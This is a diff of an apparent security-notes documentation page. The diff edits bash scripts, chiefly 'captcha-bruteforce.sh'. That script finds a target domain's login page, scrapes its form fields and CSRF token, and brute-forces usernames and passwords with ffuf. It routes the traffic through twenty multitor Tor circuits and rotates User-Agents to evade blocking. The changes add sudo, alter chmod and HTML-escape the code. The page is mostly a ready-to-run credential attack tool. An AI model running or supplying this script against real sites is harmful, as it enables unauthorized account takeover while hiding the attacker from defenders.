@@ -417,8 +417,8 @@ fi
 # Install multitor repo
 if [ ! -d "/usr/share/multitor" ]; then
     git clone https://github.com/trimstray/multitor /usr/share/multitor
-    chmod 755 /usr/share/multitor/*
-    cd /usr/share/multitor && ./setup.sh install
+    chmod +x /usr/share/multitor/*
+    cd /usr/share/multitor && sudo ./setup.sh install
     color_print GREEN "[*] Successfully Installed multitor"
 fi
 
@@ -432,7 +432,7 @@ if command -v multitor &>/dev/null; then
     multitor -k &>/dev/null || true
 fi
 
-multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy
+sudo multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy
 
 # Find Login Page
 LOGIN=$(katana -u "$URL" -depth 3 -silent | \
@@ -602,8 +602,8 @@ fi
 # Install multitor repo
 if [ ! -d "/usr/share/multitor" ]; then
     git clone https://github.com/trimstray/multitor /usr/share/multitor
-    chmod 755 /usr/share/multitor/*
-    cd /usr/share/multitor && ./setup.sh install
+    chmod +x /usr/share/multitor/*
+    cd /usr/share/multitor && sudo ./setup.sh install
     color_print GREEN "[*] Successfully Installed multitor"
 fi
 
@@ -617,7 +617,7 @@ if command -v multitor &>/dev/null; then
     multitor -k &>/dev/null || true
 fi
 
-multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy
+sudo multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy
 
 # Find Login Page
 LOGIN=$(katana -u "$URL" -depth 3 -silent | \
@@ -793,19 +793,18 @@ Create Script
 sudo nano captcha-bruteforce.sh
 ```
 
-```bash
-#!/bin/bash
+<pre class="language-bash"><code class="lang-bash">#!/bin/bash
 
-# Config & Colors
+# Config &#x26; Colors
 RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
 color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 
 # Root Check
-[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }
+[[ "$(id -u)" -ne 0 ]] &#x26;&#x26; { color_print RED "[X] Please run as ROOT."; exit 1; }
 
 # Input Check
 if [ $# -lt 1 ]; then
-    echo "Usage: $0 <domain.com>"
+    echo "Usage: $0 &#x3C;domain.com>"
     exit 1
 fi
 
@@ -817,14 +816,14 @@ DEPS="git seclists tor npm nodejs polipo netcat obfs4proxy dnsutils bind9-utils 
 
 # Install Packages
 for pkg in $DEPS; do
-    if ! dpkg -s "$pkg" &>/dev/null; then
+    if ! dpkg -s "$pkg" &#x26;>/dev/null; then
         color_print YELLOW "[!] Installing $pkg..."
         apt install -y "$pkg"
     fi
 done
 
 # install polipo
-if ! command -v "polipo" >/dev/null 2>&1; then
+if ! command -v "polipo" >/dev/null 2>&#x26;1; then
     wget http://archive.ubuntu.com/ubuntu/pool/universe/p/polipo/polipo_1.1.1-8_amd64.deb -O /tmp/polipo_amd64.deb
     chmod +x /tmp/polipo_amd64.deb
     dpkg -i /tmp/polipo_amd64.deb
@@ -832,7 +831,7 @@ if ! command -v "polipo" >/dev/null 2>&1; then
 fi
 
 # Install Node.js packages
-if ! command -v multitor &>/dev/null; then
+if ! command -v multitor &#x26;>/dev/null; then
     color_print GREEN "[*] Installing http-proxy-to-socks..."
     npm install -g multitor http-proxy-to-socks
 fi
@@ -840,8 +839,8 @@ fi
 # Install multitor repo
 if [ ! -d "/usr/share/multitor" ]; then
     git clone https://github.com/trimstray/multitor /usr/share/multitor
-    chmod 755 /usr/share/multitor/*
-    cd /usr/share/multitor && ./setup.sh install
+    chmod +x /usr/share/multitor/*
+    cd /usr/share/multitor &#x26;&#x26; sudo ./setup.sh install
     color_print GREEN "[*] Successfully Installed multitor"
 fi
 
@@ -851,12 +850,12 @@ if ! systemctl is-active --quiet tor; then
 fi
 
 # Start multitor
-if command -v multitor &>/dev/null; then
-    multitor -k &>/dev/null || true
+if command -v multitor &#x26;>/dev/null; then
+    multitor -k &#x26;>/dev/null || true
 fi
 
-multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy
-
+<strong>sudo multitor --init 20 --user debian-tor --socks-port 9000 --control-port 9900 --proxy privoxy
+</strong>
 # Find Login Page
 LOGIN=$(katana -u "$URL" -depth 3 -silent | \
 grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
@@ -869,20 +868,20 @@ if [ -z "$LOGIN" ]; then
 fi
 
 HTML=$(curl -s "$LOGIN")
-FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
+FORM=$(echo "$HTML" | sed -n '/&#x3C;form/,/&#x3C;\/form>/p' | head -n 100)
 
 # CAPTCHA check
-[ -z "$ACTION" ] && ACTION="$LOGIN"
+[ -z "$ACTION" ] &#x26;&#x26; ACTION="$LOGIN"
 if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
     CAPTCHA=""
 fi
 
-# Extract Form Action & Method
+# Extract Form Action &#x26; Method
 ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
-[ -z "$ACTION" ] && ACTION="$LOGIN"
+[ -z "$ACTION" ] &#x26;&#x26; ACTION="$LOGIN"
 
 METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
-[ -z "$METHOD" ] && METHOD="post"
+[ -z "$METHOD" ] &#x26;&#x26; METHOD="post"
 
 BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
 if [[ "$ACTION" == /* ]]; then
@@ -893,16 +892,16 @@ else
     FULL_ACTION=$(dirname "$LOGIN")"/$ACTION"
 fi
 
-# Extract Username & Password Fields
-USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
-PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
-[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
-[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"
+# Extract Username &#x26; Password Fields
+USERNAME_FIELD=$(echo "$FORM" | grep -oEi '&#x3C;input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '&#x3C;input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+[ -z "$USERNAME_FIELD" ] &#x26;&#x26; USERNAME_FIELD="username"
+[ -z "$PASSWORD_FIELD" ] &#x26;&#x26; PASSWORD_FIELD="password"
 
 # CSRF Token Extraction
 CSRF_FIELD=""
 CSRF_VALUE=""
-HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
+HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '&#x3C;input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
 while read -r INPUT; do
     NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
     VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
@@ -911,11 +910,11 @@ while read -r INPUT; do
         CSRF_VALUE="$VALUE"
         break
     fi
-done <<< "$HIDDEN_INPUTS"
+done &#x3C;&#x3C;&#x3C; "$HIDDEN_INPUTS"
 
 # Prepare POST Data
-DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2&${CAPTCHA}"
-[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
+DATA="${USERNAME_FIELD}=FUZZ1&#x26;${PASSWORD_FIELD}=FUZZ2&#x26;${CAPTCHA}"
+[ -n "$CSRF_FIELD" ] &#x26;&#x26; [ -n "$CSRF_VALUE" ] &#x26;&#x26; DATA="${CSRF_FIELD}=${CSRF_VALUE}&#x26;${DATA}"
 
 COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')
 
@@ -934,7 +933,7 @@ HEADERS=(
 
 # Run FFUF
 if [[ "$METHOD" == "get" ]]; then
-    FFUF_URL="${FULL_ACTION}?${DATA}&${CAPTCHA}"
+    FFUF_URL="${FULL_ACTION}?${DATA}&#x26;${CAPTCHA}"
     ffuf -u "$FFUF_URL" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
@@ -955,7 +954,7 @@ else
          -H "User-Agent:FUZZ3" \
          "${HEADERS[@]}"
 fi
-```
+</code></pre>
 
 {% hint style="info" %}
 Run Script
